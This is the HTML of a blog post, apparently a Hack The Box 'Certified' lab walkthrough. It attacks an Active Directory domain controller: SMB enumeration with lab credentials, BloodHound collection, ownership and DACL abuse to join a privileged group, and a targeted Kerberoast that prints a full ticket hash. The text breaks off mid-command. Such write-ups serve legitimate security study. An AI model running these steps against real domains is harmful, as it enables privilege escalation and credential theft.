@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Muyi">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/01/29/hackthebox/htb-certified/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/elmo-launch.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/elmo-launch.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/elmo-launch.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HTB-Certified | Muyi&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":5,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":false,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Blog for storing the knowledges I need (;","subtitle":{"text":["sudo echo \"subtitle goes here\""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/1/22 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Muyi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">37</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HTB-Certified</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/elmo.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Muyi</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-01-29 22:09:25</span>
+        <span class="mobile">2025-01-29 22:09:25</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-17 13:09:59</span>
+            <span class="mobile">2025-08-17 13:09:59</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Medium/">Medium</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Windows/">Windows</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-01-15 19:26:53Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="SMB-Share-Files-Failed"><a href="#SMB-Share-Files-Failed" class="headerlink" title="SMB Share Files (Failed)"></a>SMB Share Files (Failed)</h3><p>check smb  </p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ crackmapexec smb 10.10.11.41 -u judith.mader -p judith09 --shares</span><br><span class="line">SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09</span><br><span class="line">SMB         10.10.11.41     445    DC01             [+] Enumerated shares</span><br><span class="line">SMB         10.10.11.41     445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.41     445    DC01             -----           -----------     ------</span><br><span class="line">SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.41     445    DC01             C$                              Default share</span><br><span class="line">SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share</span><br><span class="line">SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>notice that user <code>judith mader</code> can access <code>IPC$ | NETLOGON | SYSVOL</code> share<ul>
+<li>using <code>smbclient</code></li>
+<li>access the share files</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>browsed through the SMB shared files, didn’t notice anything interesting unfortunately.</p>
+</blockquote>
+<hr>
+
+<h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>bloodhound</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41/bh]</span><br><span class="line">└─$ bloodhound-python -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 -c All</span><br><span class="line">INFO: Found AD domain: certified.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc01.certified.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc01.certified.htb</span><br><span class="line">INFO: Found 10 <span class="built_in">users</span></span><br><span class="line">INFO: Found 53 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: DC01.certified.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 15S</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-certified/bloodhound-users.png"
+                      alt="bloodhound-users"
+                ></p>
+<ul>
+<li>total 10 users in the domain<br></li>
+</ul>
+<p>Identify the path <code>(judith -&gt; management_svc -&gt; ca_operator)</code> which will be used as attack method.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-certified/esc-path.png"
+                      alt="esc-path"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-certified/ca-op.png"
+                      alt="ca-op"
+                ><br><br></p>
+<h2 id="Ownership"><a href="#Ownership" class="headerlink" title="Ownership"></a>Ownership</h2><p>Abuse the configuration<br>  a. set new ownership<br>  b. obtain permission to add member<br>  c. add judith into the group<br>  d. verify  </p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set new ownership to user judith.mader which is owned</span></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ impacket-owneredit -action write -new-owner <span class="string">&#x27;judith.mader&#x27;</span> -target <span class="string">&#x27;management&#x27;</span> <span class="string">&#x27;certified.htb&#x27;</span>/<span class="string">&#x27;judith.mader&#x27;</span>:<span class="string">&#x27;judith09&#x27;</span></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">[*] Current owner information below</span><br><span class="line">[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103</span><br><span class="line">[*] - sAMAccountName: judith.mader</span><br><span class="line">[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb</span><br><span class="line">[*] OwnerSid modified successfully!</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify permission for user judith.mader to have full control over management group</span></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ impacket-dacledit -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -principal <span class="string">&#x27;judith&#x27;</span> -target <span class="string">&#x27;management&#x27;</span> <span class="string">&#x27;certified.htb&#x27;</span>/<span class="string">&#x27;judith.mader&#x27;</span>:<span class="string">&#x27;judith09&#x27;</span></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">[-] Principal SID not found <span class="keyword">in</span> LDAP (judith)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add user judith.mader into management group</span></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ impacket-dacledit -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -principal <span class="string">&#x27;judith.mader&#x27;</span> -target <span class="string">&#x27;management&#x27;</span> <span class="string">&#x27;certified.htb&#x27;</span>/<span class="string">&#x27;judith.mader&#x27;</span>:<span class="string">&#x27;judith09&#x27;</span></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">[*] DACL backed up to dacledit-20250116-034403.bak</span><br><span class="line">[*] DACL modified successfully!</span><br><span class="line"></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ net rpc group addmem <span class="string">&quot;management&quot;</span> <span class="string">&quot;judith.mader&quot;</span> -U <span class="string">&quot;certified.htb&quot;</span>/<span class="string">&quot;judith.mader&quot;</span>%<span class="string">&quot;judith09&quot;</span> -S <span class="string">&quot;DC01.certified.htb&quot;</span></span><br><span class="line"></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ net rpc group members <span class="string">&quot;management&quot;</span> -U <span class="string">&quot;certified.htb&quot;</span>/<span class="string">&quot;judith.mader&quot;</span>%<span class="string">&quot;judith09&quot;</span> -S <span class="string">&quot;DC01.certified.htb&quot;</span></span><br><span class="line">CERTIFIED\judith.mader</span><br><span class="line">CERTIFIED\management_svc</span><br></pre></td></tr></table></figure></div>
+<p>targetedKerberoast attack on management_svc, retrieve the hash and crack it</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ targetedKerberoast -v -d &#x27;certified.htb&#x27; -u &#x27;judith.mader&#x27; -p &#x27;judith09&#x27;</span><br><span class="line">[*] Starting kerberoast attacks</span><br><span class="line">[*] Fetching usernames from Active Directory with LDAP</span><br><span class="line">[+] Printing hash for (management_svc)</span><br><span class="line">$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$94a1b169920d99a9cf8d5c46d6611dab$80bd9567c20141b2cbd7d531815b870020dc4f43a499013661055ef4f9665fee66506e6f13d7b49c27932785a6384a73499eab86e36d64a6a6d5fae75a5d15abf63a873462c047eb4ebcb06a70ab24610fdd704e9e1fae75c25a7abea193232e5869664eb4562012138710e906ea169d9e71a391497ed59764e2070d652ca09dfcb36bf2101ad4dc306af1b4bb33448632ceb5ce041e534df307018e1466a0e1fce4f0ade6c2e11e7bef26f405ae99b1523d345c76964e7cc3a79780091bf8d81b24d4d4c125e3edeef47c44bb9c8b841fba71e86aa81f8c417fd4c70ee629a161568d3c33c759b923c0d39bff4cbeb618ef0af0a65527311e1115aad512268e6ce267a27a89481b7d4210c99bfd72a5c22722f569c1e1ce9ae0260bef56a84343af79ea69b8a78d804e1a57de65fb03d744924afbec25f5a9e391eaa74930b8ec2abe96f257d6eb8689c94634ec48c45b29c96080687c39a541b3bf034a0509fa0a12f75d6a3bf79a203b93941fea21e5e400d15a3c35cd8689362cb88fcb7c4e60be114a46646fe7ce7fd0cbfac8d5fc59725bea34bef9efd1d1ab61073e8e70f4f6239552a34b84354c8e78b71da5b1dac8bab55554369d57c72042fef26c6d6bcb8c18dd84c4fdd0e6ad9f41627d572f86071225350d41d7462ff8da87c8fd1c003fab88722b90a8cff57445120adfe08ecfa3464d6c630b3f41391317e076165e1f02cfdcd8a53559394b7bd32ebd192c0c54a01d39de1d6c9316250757118c771e60e159830421911363f4b2e72d6ad9c4aedc17cd5b61c554cb06786d34f6aa9c4a0169bf5b7f7bcaf3476239e06ea8b5724beec20579d540cab6c008fcb3c5a22aa59d1b4266e0f20e9c65b4025eb1024a18d0ad3da6c67b725441d5bc75b40fd3edfc1ade1ae58fbd168aedf4c3edc99e7c2ff64b81134d3fd4185261aebe69f99abe81f92230841e7f87f996b2f2bcf6d4cec391e487a451b692c68a83f61ebe25a5100fc6d135f417748c5cd089ab5a1083a1c43072c64e5769babb073be0eb220b4c676d7d9dbaa0d86caa5e1128721d47cf65fe00e8b78b11e805c78c68d54ebfaf45001ea484d5522ffb67c85772b51eabbfc45213acbc107e2015cf529970f97e39f31f97343ab5fa0f6cd041bcf1113b638a92d692c45f0a124f1896afa5bb84ce0c0a6d515749a6a7332cca298c6b1a79615863da08965726799dc02f30108fde03ac14ac58481436779771420fd1109150ba46658d6f8efacaaf45ec93cf29de425d83045858a0e00d8560ea297da4e3e0e5ff5e489a0731c91ad9a853f139db9aecb1050562df5d983a7ff998c49076f31fb893cd70a52cb80fdf3843c86f862dd22b0f6d4c6cf906885b5e1e47aaef9d888b9b8f7884cc5c981080825898be9917633b7d79b7e58c306d0616d558aca10a88c543257943021d95b8f0a5f406c2442f7ff00bc82ea6e11117f9668d8694a21ecff3be8d064300607f6d41c3aac68f2e5ace1897fa118ecb79f8b44a01ec4a0b9493436948ca42f0dd6cb1071cf4d285e2ed94c9d07fac5b80efe58f2e25b2a279c3d8e821b1</span><br><span class="line"></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/certified~10.10.11.41]</span><br><span class="line">└─$ cat management-svc_hash</span><br><span 